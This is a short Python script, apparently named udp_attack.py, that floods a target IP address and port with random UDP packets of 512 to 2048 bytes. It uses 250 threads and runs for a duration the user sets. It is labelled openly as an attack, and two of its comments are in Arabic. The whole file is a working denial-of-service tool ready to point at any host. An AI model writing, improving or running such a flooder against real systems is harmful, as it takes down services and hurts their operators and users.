import socket
import random
import sys
import time
import threading

if len(sys.argv) < 4:
    print("Usage: python3 udp_attack.py <ip> <port> <duration>")
    sys.exit()

ip = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
timeout = time.time() + duration

print(f"🚀 Boosted UDP attack on {ip}:{port} for {duration} seconds...")

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(random.randint(512, 2048))  # حجم متغير

    while time.time() < timeout:
        try:
            sock.sendto(bytes_data, (ip, port))
        except Exception:
            continue

threads = []

for i in range(250):  # عدد عالي من الثريدات
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print("✅ UDP flood finished.")
